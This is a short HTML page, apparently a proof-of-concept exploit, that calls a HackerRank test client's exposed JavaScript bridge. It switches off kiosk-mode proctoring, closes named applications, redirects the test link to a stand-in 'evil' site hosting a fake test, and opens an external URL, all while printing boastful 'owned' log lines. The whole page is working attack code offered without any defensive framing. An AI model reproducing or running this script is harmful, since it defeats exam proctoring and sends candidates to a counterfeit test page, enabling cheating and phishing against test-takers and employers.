<!DOCTYPE html>
<html>
<body style="background:#000;color:#0f0;font:16px Consolas">
<h2>HackerRank Test – Owned</h2>
<pre id="log">Running evil payload...</pre>
<script>
// 1. Disable proctoring
window.hackerranktest.unSetKioskMode();

// 2. Kill anti-cheat tools
window.hackerranktest.systemCheck.closeBlockedApps(["cluely","whatsapp"]);

// 3. Hijack the real test URL
window.hackerranktest.setTestLink("https://your-evil-site.com/fake-test");
document.getElementById("log").textContent += "\n[+] Next Continue button → goes to YOUR fake test";

// 4. Open rickroll for fun
window.hackerranktest.openExternalUrl("https://youtu.be/dQw4w9WgXcQ");
document.getElementById("log").textContent += "\n[+] Rickroll opened";

document.getElementById("log").textContent += "\n\nDone. Test completely owned.";
</script>
